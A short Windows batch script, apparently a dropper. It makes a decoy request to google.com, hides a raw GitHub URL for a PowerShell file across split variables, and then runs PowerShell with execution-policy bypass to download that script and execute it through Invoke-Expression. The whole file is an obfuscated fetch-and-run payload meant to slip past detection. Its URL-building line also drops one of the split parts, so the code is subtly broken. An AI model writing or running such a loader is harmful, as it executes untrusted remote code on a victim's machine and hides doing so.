@echo off
setlocal enabledelayedexpansion

REM Fetch random junk (noise)
curl https://www.google.com >nul 2>&1

REM Build URL parts scattered
set "a=https://raw.githu"
set "b=busercontent.co"
set "c=m/Axolotl-in-void/powerhell/main/file.ps1"
set "url=!a!b!c!"

REM PowerShell with indirect variable
set "webclient=System.Net.WebClient"
set "method=DownloadString"

powershell -NoProfile -ExecutionPolicy Bypass -Command "$c=^(New-Object !webclient!^).!method!^('!url!'^);Invoke-Expression $c"
pause
